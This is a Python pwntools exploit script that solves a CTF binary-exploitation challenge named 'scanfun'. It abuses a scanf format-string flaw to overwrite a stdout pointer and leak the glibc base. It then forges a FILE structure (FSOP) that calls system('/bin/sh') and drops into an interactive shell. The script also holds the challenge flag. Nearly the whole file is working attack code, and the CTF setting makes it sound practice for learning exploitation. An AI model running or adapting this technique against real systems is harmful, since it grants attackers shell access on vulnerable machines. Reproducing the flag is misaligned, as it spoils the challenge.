from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./scanner_patched', '''
    b *(scan+145)
    b *(scan+162)
    continue
''')

# p = remote('scanfun.harkonnen.b01lersc.tf', 8443, ssl=True)

glibc_e = ELF('./libc.so.6')

# 1. get last three significant bytes of _IO_2_1_stdout_
p.recvuntil(b"A hint for you. Just a byte, no more [")
lsb_3 = int(p.recvuntil(b']\n', drop=True), 16)
lsb_2 = (glibc_e.symbols['_IO_2_1_stdout_']>>8)&0xff  # second nibble of last second significant byte of _IO_2_1_stdout_ has a 1/16 possibility of being hit
lsb_1 = glibc_e.symbols['_IO_2_1_stdout_']&0xff

# 2. fmtstr in scanf to make _IO_2_1_stdout_ be on stack
# 16th argument of scanf is scan saved rbp value (main rbp value), overwrite what it points to with last three significant bytes of _IO_2_1_stdout_ after eight-byte-padding (main return address is eight bytes after main rbp value and has a fixed three-byte offset from glibc base address)
payload1 = b'A'*8+bytes([lsb_1, lsb_2, lsb_3])
p.sendlineafter(b"What do you want to scan?\n", f'%16${len(payload1)}c '.encode()+payload1)

# 3. fmtstr in scanf to leak glibc base address using _IO_2_1_stdout_ as read primitive
# 19th argument of scanf is glibc stdout address (_IO_2_1_stdout_), overwrite what it points to with 0xfbad1887 for _flags, 0 for _IO_read_ptr, _IO_read_end, and _IO_read_base, and last three significant bytes of _IO_2_1_stdout_ for _IO_write_base
payload2 = p64(0xfbad1887)+p64(0)*3+bytes([lsb_1, lsb_2, lsb_3])
p.sendlineafter(b"What do you want to scan?\n", f'%19${len(payload2)}c '.encode()+payload2)
# bytes from _IO_write_base (_IO_2_1_stdout_) to _IO_write_ptr (_IO_2_1_stdout_+0x83) will be leaked
glibc_base_addr = u64(p.recv(0x83)[0x28:0x30])-0x21b803
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 4. fmtstr in scanf to trigger FSOP
# 19th argument of scanf is glibc stdout address (_IO_2_1_stdout_), overwrite what it points to with fake file structure for FSOP
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18)
payload3 = bytes(fake)
p.sendlineafter(b"What do you want to scan?\n", f'%19${len(payload3)}c '.encode()+payload3)

p.interactive()

# bctf{bUt_wh0_sc4nfs_the_5canf3r5_psof2s}